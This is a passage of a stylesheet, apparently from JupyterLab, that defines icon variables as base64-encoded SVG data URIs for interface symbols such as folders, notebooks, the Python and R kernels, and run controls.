  --jp-icon-new-folder: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTIwIDZoLThsLTItMkg0Yy0xLjExIDAtMS45OS44OS0xLjk5IDJMMiAxOGMwIDEuMTEuODkgMiAyIDJoMTZjMS4xMSAwIDItLjg5IDItMlY4YzAtMS4xMS0uODktMi0yLTJ6bS0xIDhoLTN2M2gtMnYtM2gtM3YtMmgzVjloMnYzaDN2MnoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-not-trusted: url(data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI1IDI1Ij4KICAgIDxwYXRoIGNsYXNzPSJqcC1pY29uMiIgc3Ryb2tlPSIjMzMzMzMzIiBzdHJva2Utd2lkdGg9IjIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMgMykiIGQ9Ik0xLjg2MDk0IDExLjQ0MDlDMC44MjY0NDggOC43NzAyNyAwLjg2Mzc3OSA2LjA1NzY0IDEuMjQ5MDcgNC4xOTkzMkMyLjQ4MjA2IDMuOTMzNDcgNC4wODA2OCAzLjQwMzQ3IDUuNjAxMDIgMi44NDQ5QzcuMjM1NDkgMi4yNDQ0IDguODU2NjYgMS41ODE1IDkuOTg3NiAxLjA5NTM5QzExLjA1OTcgMS41ODM0MSAxMi42MDk0IDIuMjQ0NCAxNC4yMTggMi44NDMzOUMxNS43NTAzIDMuNDEzOTQgMTcuMzk5NSAzLjk1MjU4IDE4Ljc1MzkgNC4yMTM4NUMxOS4xMzY0IDYuMDcxNzcgMTkuMTcwOSA4Ljc3NzIyIDE4LjEzOSAxMS40NDA5QzE3LjAzMDMgMTQuMzAzMiAxNC42NjY4IDE3LjE4NDQgOS45OTk5OSAxOC45MzU0QzUuMzMzMTkgMTcuMTg0NCAyLjk2OTY4IDE0LjMwMzIgMS44NjA5NCAxMS40NDA5WiIvPgogICAgPHBhdGggY2xhc3M9ImpwLWljb24yIiBzdHJva2U9IiMzMzMzMzMiIHN0cm9rZS13aWR0aD0iMiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoOS4zMTU5MiA5LjMyMDMxKSIgZD0iTTcuMzY4NDIgMEwwIDcuMzY0NzkiLz4KICAgIDxwYXRoIGNsYXNzPSJqcC1pY29uMiIgc3Ryb2tlPSIjMzMzMzMzIiBzdHJva2Utd2lkdGg9IjIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuMzE1OTIgMTYuNjgzNikgc2NhbGUoMSAtMSkiIGQ9Ik03LjM2ODQyIDBMMCA3LjM2NDc5Ii8+Cjwvc3ZnPgo=);
  --jp-icon-notebook: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8ZyBjbGFzcz0ianAtbm90ZWJvb2staWNvbi1jb2xvciBqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiNFRjZDMDAiPgogICAgPHBhdGggZD0iTTE4LjcgMy4zdjE1LjRIMy4zVjMuM2gxNS40bTEuNS0xLjVIMS44djE4LjNoMTguM2wuMS0xOC4zeiIvPgogICAgPHBhdGggZD0iTTE2LjUgMTYuNWwtNS40LTQuMy01LjYgNC4zdi0xMWgxMXoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-numbering: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAyOCAyOCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KCTxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CgkJPHBhdGggZD0iTTQgMTlINlYxOS41SDVWMjAuNUg2VjIxSDRWMjJIN1YxOEg0VjE5Wk01IDEwSDZWNkg0VjdINVYxMFpNNCAxM0g1LjhMNCAxNS4xVjE2SDdWMTVINS4yTDcgMTIuOVYxMkg0VjEzWk05IDdWOUgyM1Y3SDlaTTkgMjFIMjNWMTlIOVYyMVpNOSAxNUgyM1YxM0g5VjE1WiIvPgoJPC9nPgo8L3N2Zz4K);
  --jp-icon-offline-bolt: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjE2Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTEyIDIuMDJjLTUuNTEgMC05Ljk4IDQuNDctOS45OCA5Ljk4czQuNDcgOS45OCA5Ljk4IDkuOTggOS45OC00LjQ3IDkuOTgtOS45OFMxNy41MSAyLjAyIDEyIDIuMDJ6TTExLjQ4IDIwdi02LjI2SDhMMTMgNHY2LjI2aDMuMzVMMTEuNDggMjB6Ii8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-palette: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTE4IDEzVjIwSDRWNkg5LjAyQzkuMDcgNS4yOSA5LjI0IDQuNjIgOS41IDRINEMyLjkgNCAyIDQuOSAyIDZWMjBDMiAyMS4xIDIuOSAyMiA0IDIySDE4QzE5LjEgMjIgMjAgMjEuMSAyMCAyMFYxNUwxOCAxM1pNMTkuMyA4Ljg5QzE5Ljc0IDguMTkgMjAgNy4zOCAyMCA2LjVDMjAgNC4wMSAxNy45OSAyIDE1LjUgMkMxMy4wMSAyIDExIDQuMDEgMTEgNi41QzExIDguOTkgMTMuMDEgMTEgMTUuNDkgMTFDMTYuMzcgMTEgMTcuMTkgMTAuNzQgMTcuODggMTAuM0wyMSAxMy40MkwyMi40MiAxMkwxOS4zIDguODlaTTE1LjUgOUMxNC4xMiA5IDEzIDcuODggMTMgNi41QzEzIDUuMTIgMTQuMTIgNCAxNS41IDRDMTYuODggNCAxOCA1LjEyIDE4IDYuNUMxOCA3Ljg4IDE2Ljg4IDkgMTUuNSA5WiIvPgogICAgPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00IDZIOS4wMTg5NEM5LjAwNjM5IDYuMTY1MDIgOSA2LjMzMTc2IDkgNi41QzkgOC44MTU3NyAxMC4yMTEgMTAuODQ4NyAxMi4wMzQzIDEySDlWMTRIMTZWMTIuOTgxMUMxNi41NzAzIDEyLjkzNzcgMTcuMTIgMTIuODIwNyAxNy42Mzk2IDEyLjYzOTZMMTggMTNWMjBINFY2Wk04IDhINlYxMEg4VjhaTTYgMTJIOFYxNEg2VjEyWk04IDE2SDZWMThIOFYxNlpNOSAxNkgxNlYxOEg5VjE2WiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-paste: url(data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTE5IDJoLTQuMThDMTQuNC44NCAxMy4zIDAgMTIgMGMtMS4zIDAtMi40Ljg0LTIuODIgMkg1Yy0xLjEgMC0yIC45LTIgMnYxNmMwIDEuMS45IDIgMiAyaDE0YzEuMSAwIDItLjkgMi0yVjRjMC0xLjEtLjktMi0yLTJ6bS03IDBjLjU1IDAgMSAuNDUgMSAxcy0uNDUgMS0xIDEtMS0uNDUtMS0xIC40NS0xIDEtMXptNyAxOEg1VjRoMnYzaDEwVjRoMnYxNnoiLz4KICAgIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-pdf: url(data:image/svg+xml;base64,PHN2ZwogICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMiAyMiIgd2lkdGg9IjE2Ij4KICAgIDxwYXRoIHRyYW5zZm9ybT0icm90YXRlKDQ1KSIgY2xhc3M9ImpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iI0ZGMkEyQSIKICAgICAgIGQ9Im0gMjIuMzQ0MzY5LC0zLjAxNjM2NDIgaCA1LjYzODYwNCB2IDEuNTc5MjQzMyBoIC0zLjU0OTIyNyB2IDEuNTA4NjkyOTkgaCAzLjMzNzU3NiBWIDEuNjUwODE1NCBoIC0zLjMzNzU3NiB2IDMuNDM1MjYxMyBoIC0yLjA4OTM3NyB6IG0gLTcuMTM2NDQ0LDEuNTc5MjQzMyB2IDQuOTQzOTU0MyBoIDAuNzQ4OTIgcSAxLjI4MDc2MSwwIDEuOTUzNzAzLC0wLjYzNDk1MzUgMC42NzgzNjksLTAuNjM0OTUzNSAwLjY3ODM2OSwtMS44NDUxNjQxIDAsLTEuMjA0NzgzNTUgLTAuNjcyOTQyLC0xLjgzNDMxMDExIC0wLjY3Mjk0MiwtMC42Mjk1MjY1OSAtMS45NTkxMywtMC42Mjk1MjY1OSB6IG0gLTIuMDg5Mzc3LC0xLjU3OTI0MzMgaCAyLjIwMzM0MyBxIDEuODQ1MTY0LDAgMi43NDYwMzksMC4yNjU5MjA3IDAuOTA2MzAxLDAuMjYwNDkzNyAxLjU1MjEwOCwwLjg5MDAyMDMgMC41Njk4MywwLjU0ODEyMjMgMC44NDY2MDUsMS4yNjQ0ODAwNiAwLjI3Njc3NCwwLjcxNjM1NzgxIDAuMjc2Nzc0LDEuNjIyNjU4OTQgMCwwLjkxNzE1NTEgLTAuMjc2Nzc0LDEuNjM4OTM5OSAtMC4yNzY3NzUsMC43MTYzNTc4IC0wLjg0NjYwNSwxLjI2NDQ4IC0wLjY1MTIzNCwwLjYyOTUyNjYgLTEuNTYyOTYyLDAuODk1NDQ3MyAtMC45MTE3MjgsMC4yNjA0OTM3IC0yLjczNTE4NSwwLjI2MDQ5MzcgaCAtMi4yMDMzNDMgeiBtIC04LjE0NTg1NjUsMCBoIDMuNDY3ODIzIHEgMS41NDY2ODE2LDAgMi4zNzE1Nzg1LDAuNjg5MjIzIDAuODMwMzI0LDAuNjgzNzk2MSAwLjgzMDMyNCwxLjk1MzcwMzE0IDAsMS4yNzUzMzM5NyAtMC44MzAzMjQsMS45NjQ1NTcwNiBRIDkuOTg3MTk2MSwyLjI3NDkxNSA4LjQ0MDUxNDUsMi4yNzQ5MTUgSCA3LjA2MjA2ODQgViA1LjA4NjA3NjcgSCA0Ljk3MjY5MTUgWiBtIDIuMDg5Mzc2OSwxLjUxNDExOTkgdiAyLjI2MzAzOTQzIGggMS4xNTU5NDEgcSAwLjYwNzgxODgsMCAwLjkzODg2MjksLTAuMjkzMDU1NDcgMC4zMzEwNDQxLC0wLjI5ODQ4MjQxIDAuMzMxMDQ0MSwtMC44NDExNzc3MiAwLC0wLjU0MjY5NTMxIC0wLjMzMTA0NDEsLTAuODM1NzUwNzQgLTAuMzMxMDQ0MSwtMC4yOTMwNTU1IC0wLjkzODg2MjksLTAuMjkzMDU1NSB6IgovPgo8L3N2Zz4K);
  --jp-icon-python: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iLTEwIC0xMCAxMzEuMTYxMzYxNjk0MzM1OTQgMTMyLjM4ODk5OTkzODk2NDg0Ij4KICA8cGF0aCBjbGFzcz0ianAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjMzA2OTk4IiBkPSJNIDU0LjkxODc4NSw5LjE5Mjc0MjFlLTQgQyA1MC4zMzUxMzIsMC4wMjIyMTcyNyA0NS45NTc4NDYsMC40MTMxMzY5NyA0Mi4xMDYyODUsMS4wOTQ2NjkzIDMwLjc2MDA2OSwzLjA5OTE3MzEgMjguNzAwMDM2LDcuMjk0NzcxNCAyOC43MDAwMzUsMTUuMDMyMTY5IHYgMTAuMjE4NzUgaCAyNi44MTI1IHYgMy40MDYyNSBoIC0yNi44MTI1IC0xMC4wNjI1IGMgLTcuNzkyNDU5LDAgLTE0LjYxNTc1ODgsNC42ODM3MTcgLTE2Ljc0OTk5OTgsMTMuNTkzNzUgLTIuNDYxODE5OTgsMTAuMjEyOTY2IC0yLjU3MTAxNTA4LDE2LjU4NjAyMyAwLDI3LjI1IDEuOTA1OTI4Myw3LjkzNzg1MiA2LjQ1NzU0MzIsMTMuNTkzNzQ4IDE0LjI0OTk5OTgsMTMuNTkzNzUgaCA5LjIxODc1IHYgLTEyLjI1IGMgMCwtOC44NDk5MDIgNy42NTcxNDQsLTE2LjY1NjI0OCAxNi43NSwtMTYuNjU2MjUgaCAyNi43ODEyNSBjIDcuNDU0OTUxLDAgMTMuNDA2MjUzLC02LjEzODE2NCAxMy40MDYyNSwtMTMuNjI1IHYgLTI1LjUzMTI1IGMgMCwtNy4yNjYzMzg2IC02LjEyOTk4LC0xMi43MjQ3NzcxIC0xMy40MDYyNSwtMTMuOTM3NDk5NyBDIDY0LjI4MTU0OCwwLjMyNzk0Mzk3IDU5LjUwMjQzOCwtMC4wMjAzNzkwMyA1NC45MTg3ODUsOS4xOTI3NDIxZS00IFogbSAtMTQuNSw4LjIxODc1MDEyNTc5IGMgMi43Njk1NDcsMCA1LjAzMTI1LDIuMjk4NjQ1NiA1LjAzMTI1LDUuMTI0OTk5NiAtMmUtNiwyLjgxNjMzNiAtMi4yNjE3MDMsNS4wOTM3NSAtNS4wMzEyNSw1LjA5Mzc1IC0yLjc3OTQ3NiwtMWUtNiAtNS4wMzEyNSwtMi4yNzc0MTUgLTUuMDMxMjUsLTUuMDkzNzUgLTEwZS03LC0yLjgyNjM1MyAyLjI1MTc3NCwtNS4xMjQ5OTk2IDUuMDMxMjUsLTUuMTI0OTk5NiB6Ii8+CiAgPHBhdGggY2xhc3M9ImpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iI2ZmZDQzYiIgZD0ibSA4NS42Mzc1MzUsMjguNjU3MTY5IHYgMTEuOTA2MjUgYyAwLDkuMjMwNzU1IC03LjgyNTg5NSwxNi45OTk5OTkgLTE2Ljc1LDE3IGggLTI2Ljc4MTI1IGMgLTcuMzM1ODMzLDAgLTEzLjQwNjI0OSw2LjI3ODQ4MyAtMTMuNDA2MjUsMTMuNjI1IHYgMjUuNTMxMjQ3IGMgMCw3LjI2NjM0NCA2LjMxODU4OCwxMS41NDAzMjQgMTMuNDA2MjUsMTMuNjI1MDA0IDguNDg3MzMxLDIuNDk1NjEgMTYuNjI2MjM3LDIuOTQ2NjMgMjYuNzgxMjUsMCA2Ljc1MDE1NSwtMS45NTQzOSAxMy40MDYyNTMsLTUuODg3NjEgMTMuNDA2MjUsLTEzLjYyNTAwNCBWIDg2LjUwMDkxOSBoIC0yNi43ODEyNSB2IC0zLjQwNjI1IGggMjYuNzgxMjUgMTMuNDA2MjU0IGMgNy43OTI0NjEsMCAxMC42OTYyNTEsLTUuNDM1NDA4IDEzLjQwNjI0MSwtMTMuNTkzNzUgMi43OTkzMywtOC4zOTg4ODYgMi42ODAyMiwtMTYuNDc1Nzc2IDAsLTI3LjI1IC0xLjkyNTc4LC03Ljc1NzQ0MSAtNS42MDM4NywtMTMuNTkzNzUgLTEzLjQwNjI0MSwtMTMuNTkzNzUgeiBtIC0xNS4wNjI1LDY0LjY1NjI1IGMgMi43Nzk0NzgsM2UtNiA1LjAzMTI1LDIuMjc3NDE3IDUuMDMxMjUsNS4wOTM3NDcgLTJlLTYsMi44MjYzNTQgLTIuMjUxNzc1LDUuMTI1MDA0IC01LjAzMTI1LDUuMTI1MDA0IC0yLjc2OTU1LDAgLTUuMDMxMjUsLTIuMjk4NjUgLTUuMDMxMjUsLTUuMTI1MDA0IDJlLTYsLTIuODE2MzMgMi4yNjE2OTcsLTUuMDkzNzQ3IDUuMDMxMjUsLTUuMDkzNzQ3IHoiLz4KPC9zdmc+Cg==);
  --jp-icon-r-kernel: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8cGF0aCBjbGFzcz0ianAtaWNvbi1jb250cmFzdDMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjMjE5NkYzIiBkPSJNNC40IDIuNWMxLjItLjEgMi45LS4zIDQuOS0uMyAyLjUgMCA0LjEuNCA1LjIgMS4zIDEgLjcgMS41IDEuOSAxLjUgMy41IDAgMi0xLjQgMy41LTIuOSA0LjEgMS4yLjQgMS43IDEuNiAyLjIgMyAuNiAxLjkgMSAzLjkgMS4zIDQuNmgtMy44Yy0uMy0uNC0uOC0xLjctMS4yLTMuN3MtMS4yLTIuNi0yLjYtMi42aC0uOXY2LjRINC40VjIuNXptMy43IDYuOWgxLjRjMS45IDAgMi45LS45IDIuOS0yLjNzLTEtMi4zLTIuOC0yLjNjLS43IDAtMS4zIDAtMS42LjJ2NC41aC4xdi0uMXoiLz4KPC9zdmc+Cg==);
  --jp-icon-react: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMTUwIDE1MCA1NDEuOSAyOTUuMyI+CiAgPGcgY2xhc3M9ImpwLWljb24tYnJhbmQyIGpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iIzYxREFGQiI+CiAgICA8cGF0aCBkPSJNNjY2LjMgMjk2LjVjMC0zMi41LTQwLjctNjMuMy0xMDMuMS04Mi40IDE0LjQtNjMuNiA4LTExNC4yLTIwLjItMTMwLjQtNi41LTMuOC0xNC4xLTUuNi0yMi40LTUuNnYyMi4zYzQuNiAwIDguMy45IDExLjQgMi42IDEzLjYgNy44IDE5LjUgMzcuNSAxNC45IDc1LjctMS4xIDkuNC0yLjkgMTkuMy01LjEgMjkuNC0xOS42LTQuOC00MS04LjUtNjMuNS0xMC45LTEzLjUtMTguNS0yNy41LTM1LjMtNDEuNi01MCAzMi42LTMwLjMgNjMuMi00Ni45IDg0LTQ2LjlWNzhjLTI3LjUgMC02My41IDE5LjYtOTkuOSA1My42LTM2LjQtMzMuOC03Mi40LTUzLjItOTkuOS01My4ydjIyLjNjMjAuNyAwIDUxLjQgMTYuNSA4NCA0Ni42LTE0IDE0LjctMjggMzEuNC00MS4zIDQ5LjktMjIuNiAyLjQtNDQgNi4xLTYzLjYgMTEtMi4zLTEwLTQtMTkuNy01LjItMjktNC43LTM4LjIgMS4xLTY3LjkgMTQuNi03NS44IDMtMS44IDYuOS0yLjYgMTEuNS0yLjZWNzguNWMtOC40IDAtMTYgMS44LTIyLjYgNS42LTI4LjEgMTYuMi0zNC40IDY2LjctMTkuOSAxMzAuMS02Mi4yIDE5LjItMTAyLjcgNDkuOS0xMDIuNyA4Mi4zIDAgMzIuNSA0MC43IDYzLjMgMTAzLjEgODIuNC0xNC40IDYzLjYtOCAxMTQuMiAyMC4yIDEzMC40IDYuNSAzLjggMTQuMSA1LjYgMjIuNSA1LjYgMjcuNSAwIDYzLjUtMTkuNiA5OS45LTUzLjYgMzYuNCAzMy44IDcyLjQgNTMuMiA5OS45IDUzLjIgOC40IDAgMTYtMS44IDIyLjYtNS42IDI4LjEtMTYuMiAzNC40LTY2LjcgMTkuOS0xMzAuMSA2Mi0xOS4xIDEwMi41LTQ5LjkgMTAyLjUtODIuM3ptLTEzMC4yLTY2LjdjLTMuNyAxMi45LTguMyAyNi4yLTEzLjUgMzkuNS00LjEtOC04LjQtMTYtMTMuMS0yNC00LjYtOC05LjUtMTUuOC0xNC40LTIzLjQgMTQuMiAyLjEgMjcuOSA0LjcgNDEgNy45em0tNDUuOCAxMDYuNWMtNy44IDEzLjUtMTUuOCAyNi4zLTI0LjEgMzguMi0xNC45IDEuMy0zMCAyLTQ1LjIgMi0xNS4xIDAtMzAuMi0uNy00NS0xLjktOC4zLTExLjktMTYuNC0yNC42LTI0LjItMzgtNy42LTEzLjEtMTQuNS0yNi40LTIwLjgtMzkuOCA2LjItMTMuNCAxMy4yLTI2LjggMjAuNy0zOS45IDcuOC0xMy41IDE1LjgtMjYuMyAyNC4xLTM4LjIgMTQuOS0xLjMgMzAtMiA0NS4yLTIgMTUuMSAwIDMwLjIuNyA0NSAxLjkgOC4zIDExLjkgMTYuNCAyNC42IDI0LjIgMzggNy42IDEzLjEgMTQuNSAyNi40IDIwLjggMzkuOC02LjMgMTMuNC0xMy4yIDI2LjgtMjAuNyAzOS45em0zMi4zLTEzYzUuNCAxMy40IDEwIDI2LjggMTMuOCAzOS44LTEzLjEgMy4yLTI2LjkgNS45LTQxLjIgOCA0LjktNy43IDkuOC0xNS42IDE0LjQtMjMuNyA0LjYtOCA4LjktMTYuMSAxMy0yNC4xek00MjEuMiA0MzBjLTkuMy05LjYtMTguNi0yMC4zLTI3LjgtMzIgOSAuNCAxOC4yLjcgMjcuNS43IDkuNCAwIDE4LjctLjIgMjcuOC0uNy05IDExLjctMTguMyAyMi40LTI3LjUgMzJ6bS03NC40LTU4LjljLTE0LjItMi4xLTI3LjktNC43LTQxLTcuOSAzLjctMTIuOSA4LjMtMjYuMiAxMy41LTM5LjUgNC4xIDggOC40IDE2IDEzLjEgMjQgNC43IDggOS41IDE1LjggMTQuNCAyMy40ek00MjAuNyAxNjNjOS4zIDkuNiAxOC42IDIwLjMgMjcuOCAzMi05LS40LTE4LjItLjctMjcuNS0uNy05LjQgMC0xOC43LjItMjcuOC43IDktMTEuNyAxOC4zLTIyLjQgMjcuNS0zMnptLTc0IDU4LjljLTQuOSA3LjctOS44IDE1LjYtMTQuNCAyMy43LTQuNiA4LTguOSAxNi0xMyAyNC01LjQtMTMuNC0xMC0yNi44LTEzLjgtMzkuOCAxMy4xLTMuMSAyNi45LTUuOCA0MS4yLTcuOXptLTkwLjUgMTI1LjJjLTM1LjQtMTUuMS01OC4zLTM0LjktNTguMy01MC42IDAtMTUuNyAyMi45LTM1LjYgNTguMy01MC42IDguNi0zLjcgMTgtNyAyNy43LTEwLjEgNS43IDE5LjYgMTMuMiA0MCAyMi41IDYwLjktOS4yIDIwLjgtMTYuNiA0MS4xLTIyLjIgNjAuNi05LjktMy4xLTE5LjMtNi41LTI4LTEwLjJ6TTMxMCA0OTBjLTEzLjYtNy44LTE5LjUtMzcuNS0xNC45LTc1LjcgMS4xLTkuNCAyLjktMTkuMyA1LjEtMjkuNCAxOS42IDQuOCA0MSA4LjUgNjMuNSAxMC45IDEzLjUgMTguNSAyNy41IDM1LjMgNDEuNiA1MC0zMi42IDMwLjMtNjMuMiA0Ni45LTg0IDQ2LjktNC41LS4xLTguMy0xLTExLjMtMi43em0yMzcuMi03Ni4yYzQuNyAzOC4yLTEuMSA2Ny45LTE0LjYgNzUuOC0zIDEuOC02LjkgMi42LTExLjUgMi42LTIwLjcgMC01MS40LTE2LjUtODQtNDYuNiAxNC0xNC43IDI4LTMxLjQgNDEuMy00OS45IDIyLjYtMi40IDQ0LTYuMSA2My42LTExIDIuMyAxMC4xIDQuMSAxOS44IDUuMiAyOS4xem0zOC41LTY2LjdjLTguNiAzLjctMTggNy0yNy43IDEwLjEtNS43LTE5LjYtMTMuMi00MC0yMi41LTYwLjkgOS4yLTIwLjggMTYuNi00MS4xIDIyLjItNjAuNiA5LjkgMy4xIDE5LjMgNi41IDI4LjEgMTAuMiAzNS40IDE1LjEgNTguMyAzNC45IDU4LjMgNTAuNi0uMSAxNS43LTIzIDM1LjYtNTguNCA1MC42ek0zMjAuOCA3OC40eiIvPgogICAgPGNpcmNsZSBjeD0iNDIwLjkiIGN5PSIyOTYuNSIgcj0iNDUuNyIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-redo: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjE2Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+PHBhdGggZD0iTTE4LjQgMTAuNkMxNi41NSA4Ljk5IDE0LjE1IDggMTEuNSA4Yy00LjY1IDAtOC41OCAzLjAzLTkuOTYgNy4yMkwzLjkgMTZjMS4wNS0zLjE5IDQuMDUtNS41IDcuNi01LjUgMS45NSAwIDMuNzMuNzIgNS4xMiAxLjg4TDEzIDE2aDlWN2wtMy42IDMuNnoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-refresh: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDE4IDE4Ij4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTkgMTMuNWMtMi40OSAwLTQuNS0yLjAxLTQuNS00LjVTNi41MSA0LjUgOSA0LjVjMS4yNCAwIDIuMzYuNTIgMy4xNyAxLjMzTDEwIDhoNVYzbC0xLjc2IDEuNzZDMTIuMTUgMy42OCAxMC42NiAzIDkgMyA1LjY5IDMgMy4wMSA1LjY5IDMuMDEgOVM1LjY5IDE1IDkgMTVjMi45NyAwIDUuNDMtMi4xNiA1LjktNWgtMS41MmMtLjQ2IDItMi4yNCAzLjUtNC4zOCAzLjV6Ii8+CiAgICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-regex: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIwIDIwIj4KICA8ZyBjbGFzcz0ianAtaWNvbjIiIGZpbGw9IiM0MTQxNDEiPgogICAgPHJlY3QgeD0iMiIgeT0iMiIgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2Ii8+CiAgPC9nPgoKICA8ZyBjbGFzcz0ianAtaWNvbi1hY2NlbnQyIiBmaWxsPSIjRkZGIj4KICAgIDxjaXJjbGUgY2xhc3M9InN0MiIgY3g9IjUuNSIgY3k9IjE0LjUiIHI9IjEuNSIvPgogICAgPHJlY3QgeD0iMTIiIHk9IjQiIGNsYXNzPSJzdDIiIHdpZHRoPSIxIiBoZWlnaHQ9IjgiLz4KICAgIDxyZWN0IHg9IjguNSIgeT0iNy41IiB0cmFuc2Zvcm09Im1hdHJpeCgwLjg2NiAtMC41IDAuNSAwLjg2NiAtMi4zMjU1IDcuMzIxOSkiIGNsYXNzPSJzdDIiIHdpZHRoPSI4IiBoZWlnaHQ9IjEiLz4KICAgIDxyZWN0IHg9IjEyIiB5PSI0IiB0cmFuc2Zvcm09Im1hdHJpeCgwLjUgLTAuODY2IDAuODY2IDAuNSAtMC42Nzc5IDE0LjgyNTIpIiBjbGFzcz0ic3QyIiB3aWR0aD0iMSIgaGVpZ2h0PSI4Ii8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-run: url(data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTggNXYxNGwxMS03eiIvPgogICAgPC9nPgo8L3N2Zz4K);
  --jp-icon-running: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDUxMiA1MTIiPgogIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICA8cGF0aCBkPSJNMjU2IDhDMTE5IDggOCAxMTkgOCAyNTZzMTExIDI0OCAyNDggMjQ4IDI0OC0xMTEgMjQ4LTI0OFMzOTMgOCAyNTYgOHptOTYgMzI4YzAgOC44LTcuMiAxNi0xNiAxNkgxNzZjLTguOCAwLTE2LTcuMi0xNi0xNlYxNzZjMC04LjggNy4yLTE2IDE2LTE2aDE2MGM4LjggMCAxNiA3LjIgMTYgMTZ2MTYweiIvPgogIDwvZz4KPC9zdmc+Cg==);
